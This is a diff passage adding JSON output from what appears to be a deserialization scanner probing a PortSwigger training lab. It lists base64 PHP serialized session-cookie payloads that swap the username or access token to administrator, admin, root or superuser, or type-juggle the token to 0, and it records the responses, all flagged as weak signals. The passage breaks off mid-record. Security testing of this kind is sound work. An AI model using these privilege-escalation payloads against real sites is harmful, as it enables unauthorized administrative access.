+            "body_sample": "<!DOCTYPE html>\n<html>\n<!--LAB_HEAD_START-->\n    <head>\n        <link href=/resources/labheader/css/academyLabHeader.css rel=stylesheet>\n        <link href=/resources/css/labs.css rel=stylesheet>\n        <title>Arbitrary object injection in PHP</title>\n    </head>\n<!--LAB_HEAD_END-->\n    <body>\n        <script src=\"/resources/labheader/js/labHeader.js\"></script>\n        <!--LAB_HEADER_START-->\n        <div id=\"academyLabHeader\">\n            <section class='academyLabBanner'>\n                <div class=container>\n                    <div class=logo></div>\n                        <div class=title-container>\n                            <h2>Arbitrary object injection in PHP</h2>\n                            <a class=link-back href='https://portswigger.net/web-security/deserialization/exploiting"
+          },
+          "mutated": {
+            "status": 500,
+            "length": 2573,
+            "body_sample": "<!DOCTYPE html>\n<html>\n<!--LAB_HEAD_START-->\n    <head>\n        <link href=/resources/labheader/css/academyLabHeader.css rel=stylesheet>\n        <link href=/resources/css/labs.css rel=stylesheet>\n        <title>Arbitrary object injection in PHP</title>\n    </head>\n<!--LAB_HEAD_END-->\n        <script src=\"/resources/labheader/js/labHeader.js\"></script>\n        <!--LAB_HEADER_START-->\n        <div id=\"academyLabHeader\">\n            <section class='academyLabBanner'>\n                <div class=container>\n                    <div class=logo></div>\n                        <div class=title-container>\n                            <h2>Arbitrary object injection in PHP</h2>\n                            <a id='lab-link' class='button' href='/'>Back to lab home</a>\n                            <a class="
+          }
+        },
+        {
+          "payload_type": "modify_string",
+          "chain": null,
+          "payload": "Tzo0OiJVc2VyIjoyOntzOjg6InVzZXJuYW1lIjtzOjY6IndpZW5lciI7czoxMjoiYWNjZXNzX3Rva2VuIjtzOjEzOiJhZG1pbmlzdHJhdG9yIjt9",
+          "signal": "weak",
+          "indicators": [
+            "Status code changed: baseline=200 mutated=500",
+            "Control probe (non-serialized junk) returned the same status 500 and a near-identical body (similarity=0.95) with no deserializer-specific marker — the server reacts the same to any invalid value, so this change is NOT deserialization-specific (downgraded, verify manually)"
+          ],
+          "baseline": {
+            "status": 200,
+            "length": 3406,
+            "body_sample": "<!DOCTYPE html>\n<html>\n<!--LAB_HEAD_START-->\n    <head>\n        <link href=/resources/labheader/css/academyLabHeader.css rel=stylesheet>\n        <link href=/resources/css/labs.css rel=stylesheet>\n        <title>Arbitrary object injection in PHP</title>\n    </head>\n<!--LAB_HEAD_END-->\n    <body>\n        <script src=\"/resources/labheader/js/labHeader.js\"></script>\n        <!--LAB_HEADER_START-->\n        <div id=\"academyLabHeader\">\n            <section class='academyLabBanner'>\n                <div class=container>\n                    <div class=logo></div>\n                        <div class=title-container>\n                            <h2>Arbitrary object injection in PHP</h2>\n                            <a class=link-back href='https://portswigger.net/web-security/deserialization/exploiting"
+          },
+          "mutated": {
+            "status": 500,
+            "length": 2793,
+            "body_sample": "<!DOCTYPE html>\n<html>\n<!--LAB_HEAD_START-->\n    <head>\n        <link href=/resources/labheader/css/academyLabHeader.css rel=stylesheet>\n        <link href=/resources/css/labs.css rel=stylesheet>\n        <title>Arbitrary object injection in PHP</title>\n    </head>\n<!--LAB_HEAD_END-->\n        <script src=\"/resources/labheader/js/labHeader.js\"></script>\n        <!--LAB_HEADER_START-->\n        <div id=\"academyLabHeader\">\n            <section class='academyLabBanner'>\n                <div class=container>\n                    <div class=logo></div>\n                        <div class=title-container>\n                            <h2>Arbitrary object injection in PHP</h2>\n                            <a id='lab-link' class='button' href='/'>Back to lab home</a>\n                            <a class="
+          }
+        },
+        {
+          "payload_type": "modify_string",
+          "chain": null,
+          "payload": "Tzo0OiJVc2VyIjoyOntzOjg6InVzZXJuYW1lIjtzOjY6IndpZW5lciI7czoxMjoiYWNjZXNzX3Rva2VuIjtzOjU6ImFkbWluIjt9",
+          "signal": "weak",
+          "indicators": [
+            "Status code changed: baseline=200 mutated=500",
+            "Control probe (non-serialized junk) returned the same status 500 and a near-identical body (similarity=0.95) with no deserializer-specific marker — the server reacts the same to any invalid value, so this change is NOT deserialization-specific (downgraded, verify manually)"
+          ],
+          "baseline": {
+            "status": 200,
+            "length": 3406,
+            "body_sample": "<!DOCTYPE html>\n<html>\n<!--LAB_HEAD_START-->\n    <head>\n        <link href=/resources/labheader/css/academyLabHeader.css rel=stylesheet>\n        <link href=/resources/css/labs.css rel=stylesheet>\n        <title>Arbitrary object injection in PHP</title>\n    </head>\n<!--LAB_HEAD_END-->\n    <body>\n        <script src=\"/resources/labheader/js/labHeader.js\"></script>\n        <!--LAB_HEADER_START-->\n        <div id=\"academyLabHeader\">\n            <section class='academyLabBanner'>\n                <div class=container>\n                    <div class=logo></div>\n                        <div class=title-container>\n                            <h2>Arbitrary object injection in PHP</h2>\n                            <a class=link-back href='https://portswigger.net/web-security/deserialization/exploiting"
+          },
+          "mutated": {
+            "status": 500,
+            "length": 2785,
+            "body_sample": "<!DOCTYPE html>\n<html>\n<!--LAB_HEAD_START-->\n    <head>\n        <link href=/resources/labheader/css/academyLabHeader.css rel=stylesheet>\n        <link href=/resources/css/labs.css rel=stylesheet>\n        <title>Arbitrary object injection in PHP</title>\n    </head>\n<!--LAB_HEAD_END-->\n        <script src=\"/resources/labheader/js/labHeader.js\"></script>\n        <!--LAB_HEADER_START-->\n        <div id=\"academyLabHeader\">\n            <section class='academyLabBanner'>\n                <div class=container>\n                    <div class=logo></div>\n                        <div class=title-container>\n                            <h2>Arbitrary object injection in PHP</h2>\n                            <a id='lab-link' class='button' href='/'>Back to lab home</a>\n                            <a class="
+          }
+        },
+        {
+          "payload_type": "modify_string",
+          "chain": null,
+          "payload": "Tzo0OiJVc2VyIjoyOntzOjg6InVzZXJuYW1lIjtzOjY6IndpZW5lciI7czoxMjoiYWNjZXNzX3Rva2VuIjtzOjQ6InJvb3QiO30=",
+          "signal": "weak",
+          "indicators": [
+            "Status code changed: baseline=200 mutated=500",
+            "Control probe (non-serialized junk) returned the same status 500 and a near-identical body (similarity=0.95) with no deserializer-specific marker — the server reacts the same to any invalid value, so this change is NOT deserialization-specific (downgraded, verify manually)"
+          ],
+          "baseline": {
+            "status": 200,
+            "length": 3406,
+            "body_sample": "<!DOCTYPE html>\n<html>\n<!--LAB_HEAD_START-->\n    <head>\n        <link href=/resources/labheader/css/academyLabHeader.css rel=stylesheet>\n        <link href=/resources/css/labs.css rel=stylesheet>\n        <title>Arbitrary object injection in PHP</title>\n    </head>\n<!--LAB_HEAD_END-->\n    <body>\n        <script src=\"/resources/labheader/js/labHeader.js\"></script>\n        <!--LAB_HEADER_START-->\n        <div id=\"academyLabHeader\">\n            <section class='academyLabBanner'>\n                <div class=container>\n                    <div class=logo></div>\n                        <div class=title-container>\n                            <h2>Arbitrary object injection in PHP</h2>\n                            <a class=link-back href='https://portswigger.net/web-security/deserialization/exploiting"
+          },
+          "mutated": {
+            "status": 500,
+            "length": 2784,
+            "body_sample": "<!DOCTYPE html>\n<html>\n<!--LAB_HEAD_START-->\n    <head>\n        <link href=/resources/labheader/css/academyLabHeader.css rel=stylesheet>\n        <link href=/resources/css/labs.css rel=stylesheet>\n        <title>Arbitrary object injection in PHP</title>\n    </head>\n<!--LAB_HEAD_END-->\n        <script src=\"/resources/labheader/js/labHeader.js\"></script>\n        <!--LAB_HEADER_START-->\n        <div id=\"academyLabHeader\">\n            <section class='academyLabBanner'>\n                <div class=container>\n                    <div class=logo></div>\n                        <div class=title-container>\n                            <h2>Arbitrary object injection in PHP</h2>\n                            <a id='lab-link' class='button' href='/'>Back to lab home</a>\n                            <a class="
+          }
+        },
+        {
+          "payload_type": "modify_string",
+          "chain": null,
+          "payload": "Tzo0OiJVc2VyIjoyOntzOjg6InVzZXJuYW1lIjtzOjY6IndpZW5lciI7czoxMjoiYWNjZXNzX3Rva2VuIjtzOjk6InN1cGVydXNlciI7fQ==",
+          "signal": "weak",
+          "indicators": [
+            "Status code changed: baseline=200 mutated=500",
+            "Control probe (non-serialized junk) returned the same status 500 and a near-identical body (similarity=0.95) with no deserializer-specific marker — the server reacts the same to any invalid value, so this change is NOT deserialization-specific (downgraded, verify manually)"
+          ],
+          "baseline": {
+            "status": 200,
+            "length": 3406,
+            "body_sample": "<!DOCTYPE html>\n<html>\n<!--LAB_HEAD_START-->\n    <head>\n        <link href=/resources/labheader/css/academyLabHeader.css rel=stylesheet>\n        <link href=/resources/css/labs.css rel=stylesheet>\n        <title>Arbitrary object injection in PHP</title>\n    </head>\n<!--LAB_HEAD_END-->\n    <body>\n        <script src=\"/resources/labheader/js/labHeader.js\"></script>\n        <!--LAB_HEADER_START-->\n        <div id=\"academyLabHeader\">\n            <section class='academyLabBanner'>\n                <div class=container>\n                    <div class=logo></div>\n                        <div class=title-container>\n                            <h2>Arbitrary object injection in PHP</h2>\n                            <a class=link-back href='https://portswigger.net/web-security/deserialization/exploiting"
+          },
+          "mutated": {
+            "status": 500,
+            "length": 2789,
+            "body_sample": "<!DOCTYPE html>\n<html>\n<!--LAB_HEAD_START-->\n    <head>\n        <link href=/resources/labheader/css/academyLabHeader.css rel=stylesheet>\n        <link href=/resources/css/labs.css rel=stylesheet>\n        <title>Arbitrary object injection in PHP</title>\n    </head>\n<!--LAB_HEAD_END-->\n        <script src=\"/resources/labheader/js/labHeader.js\"></script>\n        <!--LAB_HEADER_START-->\n        <div id=\"academyLabHeader\">\n            <section class='academyLabBanner'>\n                <div class=container>\n                    <div class=logo></div>\n                        <div class=title-container>\n                            <h2>Arbitrary object injection in PHP</h2>\n                            <a id='lab-link' class='button' href='/'>Back to lab home</a>\n                            <a class="
+          }
+        },
+        {
+          "payload_type": "type_juggle",
+          "chain": "access_token->i:0",
+          "payload": "Tzo0OiJVc2VyIjoyOntzOjg6InVzZXJuYW1lIjtzOjY6IndpZW5lciI7czoxMjoiYWNjZXNzX3Rva2VuIjtpOjA7fQ==",
+          "signal": "weak",
+          "indicators": [
+            "Status code changed: baseline=200 mutated=500",
+            "Control probe (non-serialized junk) returned the same status 500 and a near-identical body (similarity=0.95) with no deserializer-specific marker — the server reacts the same to any invalid value, so this change is NOT deserialization-specific (downgraded, verify manually)"
+          ],
+          "baseline": {
+            "status": 200,
+            "length": 3406,
+            "body_sample": "<!DOCTYPE html>\n<html>\n<!--LAB_HEAD_START-->\n    <head>\n        <link href=/resources/labheader/css/academyLabHeader.css rel=stylesheet>\n        <link href=/resources/css/labs.css rel=stylesheet>\n        <title>Arbitrary object injection in PHP</title>\n    </head>\n<!--LAB_HEAD_END-->\n    <body>\n        <script src=\"/resources/labheader/js/labHeader.js\"></script>\n        <!--LAB_HEADER_START-->\n        <div id=\"academyLabHeader\">\n            <section class='academyLabBanner'>\n                <div class=container>\n                    <div class=logo></div>\n                        <div class=title-container>\n                            <h2>Arbitrary object injection in PHP</h2>\n                            <a class=link-back href='https://portswigger.net/web-security/deserialization/exploiting"
+          },
+          "mutated": {
+            "status": 500,
+            "length": 2781,
+            "body_sample": "<!DOCTYPE html>\n<html>\n<!--LAB_HEAD_START-->\n    <head>\n        <link href=/resources/labheader/css/academyLabHeader.css rel=stylesheet>\n        <link href=/resources/css/labs.css rel=stylesheet>\n        <title>Arbitrary object injection in PHP</title>\n    </head>\n<!--LAB_HEAD_END-->\n        <script src=\"/resources/labheader/js/labHeader.js\"></script>\n        <!--LAB_HEADER_START-->\n        <div id=\"academyLabHeader\">\n            <section class='academyLabBanner'>\n                <div class=container>\n                    <div class=logo></div>\n                        <div class=title-container>\n                            <h2>Arbitrary object injection in PHP</h2>\n                            <a id='lab-link' class='button' href='/'>Back to lab home</a>\n                            <a class="
+          }
+        },
+        {
+          "payload_type": "type_juggle_privesc",
+          "chain": "username=administrator + access_token=i:0",
+          "payload": "Tzo0OiJVc2VyIjoyOntzOjg6InVzZXJuYW1lIjtzOjEzOiJhZG1pbmlzdHJhdG9yIjtzOjEyOiJhY2Nlc3NfdG9rZW4iO2k6MDt9",
+          "signal": "weak",
+          "indicators": [
+            "Status code changed: baseline=200 mutated=500",
+            "Control probe (non-serialized junk) returned the same status 500 and a near-identical body (similarity=0.99) with no deserializer-specific marker — the server reacts the same to any invalid value, so this change is NOT deserialization-specific (downgraded, verify manually)"
+          ],
+          "baseline": {
+            "status": 200,
+            "length": 3406,
+            "body_sample": "<!DOCTYPE html>\n<html>\n<!--LAB_HEAD_START-->\n    <head>\n        <link href=/resources/labheader/css/academyLabHeader.css rel=stylesheet>\n        <link href=/resources/css/labs.css rel=stylesheet>\n        <title>Arbitrary object injection in PHP</title>\n    </head>\n<!--LAB_HEAD_END-->\n    <body>\n        <script src=\"/resources/labheader/js/labHeader.js\"></script>\n        <!--LAB_HEADER_START-->\n        <div id=\"academyLabHeader\">\n            <section class='academyLabBanner'>\n                <div class=container>\n                    <div class=logo></div>\n                        <div class=title-container>\n                            <h2>Arbitrary object injection in PHP</h2>\n                            <a class=link-back href='https://portswigger.net/web-security/deserialization/exploiting"
+          },
+          "mutated": {
+            "status": 500,
+            "length": 2577,
+            "body_sample": "<!DOCTYPE html>\n<html>\n<!--LAB_HEAD_START-->\n    <head>\n        <link href=/resources/labheader/css/academyLabHeader.css rel=stylesheet>\n        <link href=/resources/css/labs.css rel=stylesheet>\n        <title>Arbitrary object injection in PHP</title>\n    </head>\n<!--LAB_HEAD_END-->\n        <script src=\"/resources/labheader/js/labHeader.js\"></script>\n        <!--LAB_HEADER_START-->\n        <div id=\"academyLabHeader\">\n            <section class='academyLabBanner'>\n                <div class=container>\n                    <div class=logo></div>\n                        <div class=title-container>\n                            <h2>Arbitrary object injection in PHP</h2>\n                            <a id='lab-link' class='button' href='/'>Back to lab home</a>\n                            <a class="
+          }
+        }
+      ]
+    },
+    {
+      "url": "https://0aa700eb032e6b088118265c00b600c3.web-security-academy.net/",
+      "method": "GET",
+      "location": "cookie",
+      "name": "session",
+      "type": "PHP",
+      "subtype": null,
+      "confidence": "High",
+      "exploit_type": "Privilege Escalation — String Manipulation",
+      "suggested_probe": "modify_string",
+      "severity": "Medium",
+      "severity_note": null,
+      "evidence": "dynamic-weak",
+      "notes": "String field detected — try changing role/privilege value",
+      "normalized": [
+        "O:4:\"User\":2:{s:8:\"username\";s:6:\"wiener\";s:12:\"access_token\";s:32:\"c26fb9dc13q2g6v68vspsxxi4baxlwsx\";}"
+      ],
+      "mutations_count": 10,
+      "indicators": [
+        "Status code changed: baseline=200 mutated=500",
+        "Response length changed significantly: baseline=10806 mutated=2479",
+        "Control probe (non-serialized junk) returned the same status 500 and a near-identical body (similarity=0.99) with no deserializer-specific marker — the server reacts the same to any invalid value, so this change is NOT deserialization-specific (downgraded, verify manually)"
+      ],
+      "attempts": [
+        {
+          "payload_type": "modify_string",
+          "chain": null,
+          "payload": "Tzo0OiJVc2VyIjoyOntzOjg6InVzZXJuYW1lIjtzOjEzOiJhZG1pbmlzdHJhdG9yIjtzOjEyOiJhY2Nlc3NfdG9rZW4iO3M6MzI6ImMyNmZiOWRjMTNxMmc2djY4dnNwc3h4aTRiYXhsd3N4Ijt9",
+          "signal": "weak",
+          "indicators": [
+            "Status code changed: baseline=200 mutated=500",
+            "Response length changed significantly: baseline=10806 mutated=2479",
+            "Control probe (non-serialized junk) returned the same status 500 and a near-identical body (similarity=0.99) with no deserializer-specific marker — the server reacts the same to any invalid value, so this change is NOT deserialization-specific (downgraded, verify manually)"
+          ],
+          "baseline": {
+            "status": 200,
+            "length": 10806,
+            "body_sample": "<!DOCTYPE html>\n<html>\n<!--LAB_HEAD_START-->\n    <head>\n        <link href=/resources/labheader/css/academyLabHeader.css rel=stylesheet>\n        <link href=/resources/css/labsEcommerce.css rel=stylesheet>\n        <title>Arbitrary object injection in PHP</title>\n    </head>\n<!--LAB_HEAD_END-->\n    <body>\n        <script src=\"/resources/labheader/js/labHeader.js\"></script>\n        <!--LAB_HEADER_START-->\n        <div id=\"academyLabHeader\">\n            <section class='academyLabBanner'>\n                <div class=container>\n                    <div class=logo></div>\n                        <div class=title-container>\n                            <h2>Arbitrary object injection in PHP</h2>\n                            <a class=link-back href='https://portswigger.net/web-security/deserialization/e"
+          },
+          "mutated": {
+            "status": 500,
+            "length": 2479,
+            "body_sample": "<!DOCTYPE html>\n<html>\n<!--LAB_HEAD_START-->\n    <head>\n        <link href=/resources/labheader/css/academyLabHeader.css rel=stylesheet>\n        <link href=/resources/css/labs.css rel=stylesheet>\n        <title>Arbitrary object injection in PHP</title>\n    </head>\n<!--LAB_HEAD_END-->\n        <script src=\"/resources/labheader/js/labHeader.js\"></script>\n        <!--LAB_HEADER_START-->\n        <div id=\"academyLabHeader\">\n            <section class='academyLabBanner'>\n                <div class=container>\n                    <div class=logo></div>\n                        <div class=title-container>\n                            <h2>Arbitrary object injection in PHP</h2>\n                            <a class=link-back href='https://portswigger.net/web-security/deserialization/exploiting/lab-deseri"
+          }
+        },
+        {
+          "payload_type": "modify_string",
+          "chain": null,
+          "payload": "Tzo0OiJVc2VyIjoyOntzOjg6InVzZXJuYW1lIjtzOjU6ImFkbWluIjtzOjEyOiJhY2Nlc3NfdG9rZW4iO3M6MzI6ImMyNmZiOWRjMTNxMmc2djY4dnNwc3h4aTRiYXhsd3N4Ijt9",
+          "signal": "weak",
+          "indicators": [
+            "Status code changed: baseline=200 mutated=500",
+            "Response length changed significantly: baseline=10806 mutated=2471",
+            "Control probe (non-serialized junk) returned the same status 500 and a near-identical body (similarity=0.99) with no deserializer-specific marker — the server reacts the same to any invalid value, so this change is NOT deserialization-specific (downgraded, verify manually)"
+          ],
+          "baseline": {
+            "status": 200,
+            "length": 10806,
+            "body_sample": "<!DOCTYPE html>\n<html>\n<!--LAB_HEAD_START-->\n    <head>\n        <link href=/resources/labheader/css/academyLabHeader.css rel=stylesheet>\n        <link href=/resources/css/labsEcommerce.css rel=stylesheet>\n        <title>Arbitrary object injection in PHP</title>\n    </head>\n<!--LAB_HEAD_END-->\n    <body>\n        <script src=\"/resources/labheader/js/labHeader.js\"></script>\n        <!--LAB_HEADER_START-->\n        <div id=\"academyLabHeader\">\n            <section class='academyLabBanner'>\n                <div class=container>\n                    <div class=logo></div>\n                        <div class=title-container>\n                            <h2>Arbitrary object injection in PHP</h2>\n                            <a class=link-back href='https://portswigger.net/web-security/deserialization/e"
+          },
+          "mutated": {
+            "status": 500,
+            "length": 2471,
+            "body_sample": "<!DOCTYPE html>\n<html>\n<!--LAB_HEAD_START-->\n    <head>\n        <link href=/resources/labheader/css/academyLabHeader.css rel=stylesheet>\n        <link href=/resources/css/labs.css rel=stylesheet>\n        <title>Arbitrary object injection in PHP</title>\n    </head>\n<!--LAB_HEAD_END-->\n        <script src=\"/resources/labheader/js/labHeader.js\"></script>\n        <!--LAB_HEADER_START-->\n        <div id=\"academyLabHeader\">\n            <section class='academyLabBanner'>\n                <div class=container>\n                    <div class=logo></div>\n                        <div class=title-container>\n                            <h2>Arbitrary object injection in PHP</h2>\n                            <a class=link-back href='https://portswigger.net/web-security/deserialization/exploiting/lab-deseri"
+          }
+        },
+        {
+          "payload_type": "modify_string",
+          "chain": null,
+          "payload": "Tzo0OiJVc2VyIjoyOntzOjg6InVzZXJuYW1lIjtzOjQ6InJvb3QiO3M6MTI6ImFjY2Vzc190b2tlbiI7czozMjoiYzI2ZmI5ZGMxM3EyZzZ2Njh2c3BzeHhpNGJheGx3c3giO30=",
+          "signal": "weak",
+          "indicators": [
+            "Status code changed: baseline=200 mutated=500",
+            "Response length changed significantly: baseline=10806 mutated=2470",
+            "Control probe (non-serialized junk) returned the same status 500 and a near-identical body (similarity=0.99) with no deserializer-specific marker — the server reacts the same to any invalid value, so this change is NOT deserialization-specific (downgraded, verify manually)"
+          ],
+          "baseline": {
+            "status": 200,
+            "length": 10806,
+            "body_sample": "<!DOCTYPE html>\n<html>\n<!--LAB_HEAD_START-->\n    <head>\n        <link href=/resources/labheader/css/academyLabHeader.css rel=stylesheet>\n        <link href=/resources/css/labsEcommerce.css rel=stylesheet>\n        <title>Arbitrary object injection in PHP</title>\n    </head>\n<!--LAB_HEAD_END-->\n    <body>\n        <script src=\"/resources/labheader/js/labHeader.js\"></script>\n        <!--LAB_HEADER_START-->\n        <div id=\"academyLabHeader\">\n            <section class='academyLabBanner'>\n                <div class=container>\n                    <div class=logo></div>\n                        <div class=title-container>\n                            <h2>Arbitrary object injection in PHP</h2>\n                            <a class=link-back href='https://portswigger.net/web-security/deserialization/e"
+          },
+          "mutated": {
+            "status": 500,
+            "length": 2470,
+            "body_sample": "<!DOCTYPE html>\n<html>\n<!--LAB_HEAD_START-->\n    <head>\n        <link href=/resources/labheader/css/academyLabHeader.css rel=stylesheet>\n        <link href=/resources/css/labs.css rel=stylesheet>\n        <title>Arbitrary object injection in PHP</title>\n    </head>\n<!--LAB_HEAD_END-->\n        <script src=\"/resources/labheader/js/labHeader.js\"></script>\n        <!--LAB_HEADER_START-->\n        <div id=\"academyLabHeader\">\n            <section class='academyLabBanner'>\n                <div class=container>\n                    <div class=logo></div>\n                        <div class=title-container>\n                            <h2>Arbitrary object injection in PHP</h2>\n                            <a class=link-back href='https://portswigger.net/web-security/deserialization/exploiting/lab-deseri"
+          }
+        },
+        {
+          "payload_type": "modify_string",
+          "chain": null,
+          "payload": "Tzo0OiJVc2VyIjoyOntzOjg6InVzZXJuYW1lIjtzOjk6InN1cGVydXNlciI7czoxMjoiYWNjZXNzX3Rva2VuIjtzOjMyOiJjMjZmYjlkYzEzcTJnNnY2OHZzcHN4eGk0YmF4bHdzeCI7fQ==",
+          "signal": "weak",
+          "indicators": [
+            "Status code changed: baseline=200 mutated=500",
+            "Response length changed significantly: baseline=10806 mutated=2475",
+            "Control probe (non-serialized junk) returned the same status 500 and a near-identical body (similarity=0.99) with no deserializer-specific marker — the server reacts the same to any invalid value, so this change is NOT deserialization-specific (downgraded, verify manually)"
+          ],
+          "baseline": {
+            "status": 200,
+            "length": 10806,
+            "body_sample": "<!DOCTYPE html>\n<html>\n<!--LAB_HEAD_START-->\n    <head>\n        <link href=/resources/labheader/css/academyLabHeader.css rel=stylesheet>\n        <link href=/resources/css/labsEcommerce.css rel=stylesheet>\n        <title>Arbitrary object injection in PHP</title>\n    </head>\n<!--LAB_HEAD_END-->\n    <body>\n        <script src=\"/resources/labheader/js/labHeader.js\"></script>\n        <!--LAB_HEADER_START-->\n        <div id=\"academyLabHeader\">\n            <section class='academyLabBanner'>\n                <div class=container>\n                    <div class=logo></div>\n                        <div class=title-container>\n                            <h2>Arbitrary object injection in PHP</h2>\n                            <a class=link-back href='https://portswigger.net/web-security/deserialization/e"
+          },
+          "mutated": {
+            "status": 500,
+            "length": 2475,
+            "body_sample": "<!DOCTYPE html>\n<html>\n<!--LAB_HEAD_START-->\n    <head>\n        <link href=/resources/labheader/css/academyLabHeader.css rel=stylesheet>\n        <link href=/resources/css/labs.css rel=stylesheet>\n        <title>Arbitrary object injection in PHP</title>\n    </head>\n<!--LAB_HEAD_END-->\n        <script src=\"/resources/labheader/js/labHeader.js\"></script>\n        <!--LAB_HEADER_START-->\n        <div id=\"academyLabHeader\">\n            <section class='academyLabBanner'>\n                <div class=container>\n                    <div class=logo></div>\n                        <div class=title-container>\n                            <h2>Arbitrary object injection in PHP</h2>\n                            <a class=link-back href='https://portswigger.net/web-security/deserialization/exploiting/lab-deseri"
+          }
+        },
+        {
+          "payload_type": "modify_string",
+          "chain": null,
+          "payload": "Tzo0OiJVc2VyIjoyOntzOjg6InVzZXJuYW1lIjtzOjY6IndpZW5lciI7czoxMjoiYWNjZXNzX3Rva2VuIjtzOjEzOiJhZG1pbmlzdHJhdG9yIjt9",
+          "signal": "weak",
+          "indicators": [
+            "Status code changed: baseline=200 mutated=500",
+            "Response length changed significantly: baseline=10806 mutated=2695",
+            "Control probe (non-serialized junk) returned the same status 500 and a near-identical body (similarity=0.95) with no deserializer-specific marker — the server reacts the same to any invalid value, so this change is NOT deserialization-specific (downgraded, verify manually)"
+          ],
+          "baseline": {
+            "status": 200,
+            "length": 10806,
+            "body_sample": "<!DOCTYPE html>\n<html>\n<!--LAB_HEAD_START-->\n    <head>\n        <link href=/resources/labheader/css/academyLabHeader.css rel=stylesheet>\n        <link href=/resources/css/labsEcommerce.css rel=stylesheet>\n        <title>Arbitrary object injection in PHP</title>\n    </head>\n<!--LAB_HEAD_END-->\n    <body>\n        <script src=\"/resources/labheader/js/labHeader.js\"></script>\n        <!--LAB_HEADER_START-->\n        <div id=\"academyLabHeader\">\n            <section class='academyLabBanner'>\n                <div class=container>\n                    <div class=logo></div>\n                        <div class=title-container>\n                            <h2>Arbitrary object injection in PHP</h2>\n                            <a class=link-back href='https://portswigger.net/web-security/deserialization/e"
+          },
+          "mutated": {
+            "status": 500,
+            "length": 2695,
+            "body_sample": "<!DOCTYPE html>\n<html>\n<!--LAB_HEAD_START-->\n    <head>\n        <link href=/resources/labheader/css/academyLabHeader.css rel=stylesheet>\n        <link href=/resources/css/labs.css rel=stylesheet>\n        <title>Arbitrary object injection in PHP</title>\n    </head>\n<!--LAB_HEAD_END-->\n        <script src=\"/resources/labheader/js/labHeader.js\"></script>\n        <!--LAB_HEADER_START-->\n        <div id=\"academyLabHeader\">\n            <section class='academyLabBanner'>\n                <div class=container>\n                    <div class=logo></div>\n                        <div class=title-container>\n                            <h2>Arbitrary object injection in PHP</h2>\n                            <a class=link-back href='https://portswigger.net/web-security/deserialization/exploiting/lab-deseri"
+          }
+        },
+        {
+          "payload_type": "modify_string",
+          "chain": null,
+          "payload": "Tzo0OiJVc2VyIjoyOntzOjg6InVzZXJuYW1lIjtzOjY6IndpZW5lciI7czoxMjoiYWNjZXNzX3Rva2VuIjtzOjU6ImFkbWluIjt9",
+          "signal": "weak",
+          "indicators": [
+            "Status code changed: baseline=200 mutated=500",
+            "Response length changed significantly: baseline=10806 mutated=2687",
+            "Control probe (non-serialized junk) returned the same status 500 and a near-identical body (similarity=0.95) with no deserializer-specific marker — the server reacts the same to any invalid value, so this change is NOT deserialization-specific (downgraded, verify manually)"
+          ],
+          "baseline": {
+            "status": 200,
+            "length": 10806,
+            "body_sample": "<!DOCTYPE html>\n<html>\n<!--LAB_HEAD_START-->\n    <head>\n        <link href=/resources/labheader/css/academyLabHeader.css rel=stylesheet>\n        <link href=/resources/css/labsEcommerce.css rel=stylesheet>\n        <title>Arbitrary object injection in PHP</title>\n    </head>\n<!--LAB_HEAD_END-->\n    <body>\n        <script src=\"/resources/labheader/js/labHeader.js\"></script>\n        <!--LAB_HEADER_START-->\n        <div id=\"academyLabHeader\">\n            <section class='academyLabBanner'>\n                <div class=container>\n                    <div class=logo></div>\n                        <div class=title-container>\n                            <h2>Arbitrary object injection in PHP</h2>\n                            <a class=link-back href='https://portswigger.net/web-security/deserialization/e"
+          },
+          "mutated": {
+            "status": 500,
+            "length": 2687,
+            "body_sample": "<!DOCTYPE html>\n<html>\n<!--LAB_HEAD_START-->\n    <head>\n        <link href=/resources/labheader/css/academyLabHeader.css rel=stylesheet>\n        <link href=/resources/css/labs.css rel=stylesheet>\n        <title>Arbitrary object injection in PHP</title>\n    </head>\n<!--LAB_HEAD_END-->\n        <script src=\"/resources/labheader/js/labHeader.js\"></script>\n        <!--LAB_HEADER_START-->\n        <div id=\"academyLabHeader\">\n            <section class='academyLabBanner'>\n                <div class=container>\n                    <div class=logo></div>\n                        <div class=title-container>\n                            <h2>Arbitrary object injection in PHP</h2>\n                            <a class=link-back href='https://portswigger.net/web-security/deserialization/exploiting/lab-deseri"
+          }
+        },
+        {
+          "payload_type": "modify_string",
+          "chain": null,
+          "payload": "Tzo0OiJVc2VyIjoyOntzOjg6InVzZXJuYW1lIjtzOjY6IndpZW5lciI7czoxMjoiYWNjZXNzX3Rva2VuIjtzOjQ6InJvb3QiO30=",
+          "signal": "weak",
+          "indicators": [
+            "Status code changed: baseline=200 mutated=500",
+            "Response length changed significantly: baseline=10806 mutated=2686",
+            "Control probe (non-serialized junk) returned the same status 500 and a near-identical body (similarity=0.95) with no deserializer-specific marker — the server reacts the same to any invalid value, so this change is NOT deserialization-specific (downgraded, verify manually)"
+          ],
+          "baseline": {
+            "status": 200,
+            "length": 10806,
+            "body_sample": "<!DOCTYPE html>\n<html>\n<!--LAB_HEAD_START-->\n    <head>\n        <link href=/resources/labheader/css/academyLabHeader.css rel=stylesheet>\n        <link href=/resources/css/labsEcommerce.css rel=stylesheet>\n        <title>Arbitrary object injection in PHP</title>\n    </head>\n<!--LAB_HEAD_END-->\n    <body>\n        <script src=\"/resources/labheader/js/labHeader.js\"></script>\n        <!--LAB_HEADER_START-->\n        <div id=\"academyLabHeader\">\n            <section class='academyLabBanner'>\n                <div class=container>\n                    <div class=logo></div>\n                        <div class=title-container>\n                            <h2>Arbitrary object injection in PHP</h2>\n                            <a class=link-back href='https://portswigger.net/web-security/deserialization/e"
+          },
+          "mutated": {
+            "status": 500,
+            "length": 2686,
+            "body_sample": "<!DOCTYPE html>\n<html>\n<!--LAB_HEAD_START-->\n    <head>\n        <link href=/resources/labheader/css/academyLabHeader.css rel=stylesheet>\n        <link href=/resources/css/labs.css rel=stylesheet>\n        <title>Arbitrary object injection in PHP</title>\n    </head>\n<!--LAB_HEAD_END-->\n        <script src=\"/resources/labheader/js/labHeader.js\"></script>\n        <!--LAB_HEADER_START-->\n        <div id=\"academyLabHeader\">\n            <section class='academyLabBanner'>\n                <div class=container>\n                    <div class=logo></div>\n                        <div class=title-container>\n                            <h2>Arbitrary object injection in PHP</h2>\n                            <a class=link-back href='https://portswigger.net/web-security/deserialization/exploiting/lab-deseri"
+          }
+        },
+        {
+          "payload_type": "modify_string",
+          "chain": null,
+          "payload": "Tzo0OiJVc2VyIjoyOntzOjg6InVzZXJuYW1lIjtzOjY6IndpZW5lciI7czoxMjoiYWNjZXNzX3Rva2VuIjtzOjk6InN1cGVydXNlciI7fQ==",
+          "signal": "weak",
+          "indicators": [
